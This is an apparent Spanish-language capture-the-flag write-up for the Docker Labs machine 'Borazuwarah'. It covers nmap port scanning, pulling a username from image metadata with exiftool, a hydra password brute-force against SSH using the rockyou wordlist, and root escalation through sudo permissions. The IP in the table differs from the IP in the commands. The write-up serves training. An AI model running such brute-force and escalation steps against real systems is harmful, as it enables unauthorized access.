# >_ [Borazuwarah]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Docker Labs |
| **Dificultad** | 🟢 Muy Fácil  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.0.0.2` |
| **Fecha de resolución** | 2026-09-28 |

---

## 📝 Descripción

Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.

---

## 🔍 1. Fase de Reconocimiento y Enumeración

### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN allPorts
```

**Resultados del escaneo:**
* **Puerto 22/TCP**: SSH
* **Puerto 80/TCP**: HTTP

<img width="1691" height="263" alt="1Escaneo" src="https://github.com/user-attachments/assets/3af290e5-c915-4701-a110-16ca0e4617b2" />


*Escaneo profundo de servicios:*
```bash
 nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

| Puerto | Estado | Servicio | Versión |
| :---: | :---: | :--- | :--- |
| **22 / TCP** | 🟢 Abierto | SSH | OpenSSH 9.2p1 (Debian) |
| **80 / TCP** | 🟢 Abierto | HTTP | Apache httpd 2.4.59 |

<img width="1386" height="378" alt="2Escaneopuertos" src="https://github.com/user-attachments/assets/c6a1b7e5-43e5-441d-b96c-b8bc99de8c03" />

Vemos que tenemos un sitio web y el puerto ssh pero no conocemos ninguna credencial así que empezamos revisando el sitio web.

### Enumeración Web (Puerto 80)
Al inspeccionar el sitio web, nos encontramos con la siguiente interfaz que solo contiene una imagen, nos la descargamos.
<img width="685" height="495" alt="3imagen" src="https://github.com/user-attachments/assets/d56ec4c4-6ce3-4647-85dd-b3d17498e054" />

💥 2. Fase de Explotación
```bash
exiftool imagen.jpeg
```

User: borazuwarah

```bash
hydra -l borazuwarah -P /usr/share/rockyou.txt ssh://172.17.0.2
```


👑 3. Escalada de Privilegios
Enumeración del Sistema
Ahora necesitamos escalar privilegios para ser root. Analizamos el entorno buscando vectores comunes de escalada y en id vemos ...

```bash
sudo -l
```

<img width="1180" height="231" alt="5escalar" src="https://github.com/user-attachments/assets/0df2b851-0357-481c-ae19-e13dbc2a7726" />


Somos el usuario root
<img width="493" height="99" alt="6root" src="https://github.com/user-attachments/assets/da317840-a994-4dba-8630-9305a2d182e9" />


